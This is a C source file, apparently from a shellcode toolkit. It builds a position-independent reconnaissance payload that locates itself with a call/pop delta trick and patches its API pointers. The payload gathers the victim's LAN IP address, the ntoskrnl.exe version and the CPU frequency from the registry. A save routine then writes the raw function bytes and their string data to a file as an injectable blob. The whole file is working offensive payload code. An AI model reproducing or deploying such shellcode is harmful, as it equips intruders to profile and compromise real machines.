#include "shellcodes.h"
#include "global_data.h"

extern void __cdecl information_entry(global_data_t *global_data);
extern void __cdecl get_lan_info(global_data_t *global_data, char *info);
extern void __cdecl get_os_version(global_data_t *global_data, char *info, int size);
extern uint32_t __cdecl get_cpu_frequency(global_data_t *global_data);
extern void __cdecl information_code_end();

#pragma pack(push)
#pragma pack(1)
typedef struct {
  char ntoskrnl[14];      // "\\ntoskrnl.exe"
  char unknown[8];        // "unknown"
  char fmt_version[12];   // "%d.%d.%d.%d"
  char cpu_info_key[47];  // "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0"
  char mhz[5];            // "~MHz" 
  char slash[2];          // "\\"
} information_data_t;
#pragma pack(pop)

#define FIX(name) xinformation.##name = (_##name)(delta + (char *)name)

#pragma optimize("ts", on)

void __cdecl information_entry(global_data_t *global_data) {
  uint32_t delta;

  __asm {
    call x;
  x:
    pop	eax;
    sub	eax, offset x;
    mov	delta, eax
  }

  information_data_t *data = (information_data_t *)(delta + (char *)information_code_end);
  
  xinformation.data = data;

  FIX(get_lan_info);
  FIX(get_os_version);
  FIX(get_cpu_frequency);
}

#undef FIX                // undef macro FIX

void get_lan_info(global_data_t *global_data, char *info) {
  char local_name[128];

  xgethostname(local_name, sizeof(local_name));
  HOSTENT *hosts = xgethostbyname(local_name);
  if (hosts == 0) return;

  xlstrcpyA(info, xinet_ntoa(*(struct in_addr *)hosts->h_addr_list[0]));
}

void __cdecl get_os_version(global_data_t *global_data, char *info, int size) {
  information_data_t *data = (information_data_t *)xinformation.data;

  char sys_path[MAX_PATH];

  xGetSystemDirectoryA(sys_path, MAX_PATH);
  xlstrcatA(sys_path, data->ntoskrnl);

  DWORD temp;
  DWORD ver_size = xGetFileVersionInfoSizeA(sys_path, &temp);
  void *ver_info = alloc_memory(ver_size);

  if (!xGetFileVersionInfoA(sys_path, 0, ver_size, ver_info)) {
    xlstrcpyA(info, data->unknown);
    goto __error_exit;
  }

  UINT value_len;
  void *value;

  if (!xVerQueryValueA(ver_info, data->slash, &value, &value_len)) {
    xlstrcpyA(info, data->unknown);
    goto __error_exit;
  }

  VS_FIXEDFILEINFO *vsfi = (VS_FIXEDFILEINFO *)value;

  if (vsfi->dwSignature != 0xFEEF04BD) {
    xlstrcpyA(info, data->unknown);
    goto __error_exit;
  }

  xwnsprintfA(info, size, data->fmt_version, HIWORD(vsfi->dwFileVersionMS), LOWORD(vsfi->dwFileVersionMS), HIWORD(vsfi->dwFileVersionLS),
    LOWORD(vsfi->dwFileVersionLS));

__error_exit:
  free_memory(ver_info);
}

uint32_t __cdecl get_cpu_frequency(global_data_t *global_data) {
  information_data_t *data = (information_data_t *)xinformation.data;

  HKEY reg;
  uint32_t type, ret, size;

  xRegOpenKeyExA(HKEY_LOCAL_MACHINE, data->cpu_info_key, 0, KEY_READ, &reg);

  type = REG_DWORD;
  size = sizeof(DWORD);
  xRegQueryValueExA(reg, data->mhz, 0, &type, (LPBYTE)&ret, &size);

  xRegCloseKey(reg);

  return ret;
};

void __cdecl information_code_end() {
  printf(__FUNCTION__);
}

#pragma optimize("ts", off)

#undef FIX             // undef macro FIX

void information_save(char *filename) {
  char *start, *end;
  FILE *f;

  start = (char *)information_entry;
  end = (char *)information_code_end;

  printf("[*] information code size = 0x%X\n", end - start);

  f = fopen(filename, "wb");
  fwrite(start, 1, end - start, f);

  information_data_t data;

  memset(&data, 0, sizeof(data));

  lstrcpyA(data.ntoskrnl, "\\ntoskrnl.exe");
  lstrcpyA(data.unknown, "unknown");
  lstrcpyA(data.fmt_version, "%d.%d.%d.%d");
  lstrcpyA(data.cpu_info_key, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0");
  lstrcpyA(data.mhz, "~MHz");
  lstrcpyA(data.slash, "\\");

  fwrite(&data, 1, sizeof(data), f);

  printf("[*] information data size = 0x%X\n", sizeof(data));

  fclose(f);
  printf("[*] save information to %s success.\n", filename);
}
